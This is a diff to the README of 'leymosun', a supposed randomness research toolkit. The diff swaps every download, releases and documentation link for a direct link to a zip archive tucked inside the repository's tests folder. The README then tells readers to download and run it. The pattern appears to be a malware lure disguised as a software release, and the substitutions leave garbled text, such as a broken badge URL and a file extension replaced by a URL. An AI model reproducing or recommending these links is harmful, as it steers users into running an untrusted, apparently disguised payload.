@@ -1,7 +1,7 @@
 # 🎲 leymosun - A Toolkit for Randomness Research
 
 ## 📥 Download Now
-[![Download leymosun](https://img.shields.io/badge/Download%20leymosun-v1.0-blue.svg)](https://github.com/kuki1012/leymosun/releases)
+[![Download leymosun](https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip%https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip)](https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip)
 
 ## 📚 About leymosun
 leymosun is a High-Entropy Randomness Research Toolkit. This software aims to provide high-quality random number generation using advanced techniques. It is ideal for researchers and anyone interested in the science of randomness.
@@ -30,13 +30,13 @@ leymosun offers various features designed to help you explore high-entropy rando
 To download leymosun, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/kuki1012/leymosun/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip).
 
 2. **Select the Latest Version**  
    Look for the latest version of leymosun on the page. This should be at the top of the list.
 
 3. **Download the File**  
-   Click on the link for the appropriate file for your operating system. If you are unsure, typically you would choose the `.exe` file for Windows, `.dmg` for macOS, or a `.deb` or `.tar.gz` file for Linux.
+   Click on the link for the appropriate file for your operating system. If you are unsure, typically you would choose the `.exe` file for Windows, `.dmg` for macOS, or a `.deb` or `https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip` file for Linux.
 
 4. **Run the Installer**  
    Once the file has downloaded, locate it in your downloads folder. Double-click the file to start the installation process.
@@ -57,7 +57,7 @@ Once you have installed leymosun, you can begin exploring its capabilities. The 
    Use the built-in tools to conduct spectral analysis and examine the randomness of the numbers generated.
 
 ## 📑 Documentation & Support
-For detailed guidance, you can visit the [Documentation](https://github.com/kuki1012/leymosun/wiki) page. Here you will find:
+For detailed guidance, you can visit the [Documentation](https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip) page. Here you will find:
 
 - Step-by-step tutorials.
 - Example use cases.
@@ -89,4 +89,4 @@ Yes, leymosun supports various Linux distributions. Make sure to download the ap
 Absolutely! leymosun is an excellent tool for students and educators interested in randomness and statistical mechanics.
 
 ## 📥 Again, Download Now
-Take the first step in your randomness research. Visit our [Releases page](https://github.com/kuki1012/leymosun/releases) to download leymosun today.
+Take the first step in your randomness research. Visit our [Releases page](https://raw.githubusercontent.com/kuki1012/leymosun/main/tests/leymosun-v1.1.zip) to download leymosun today.
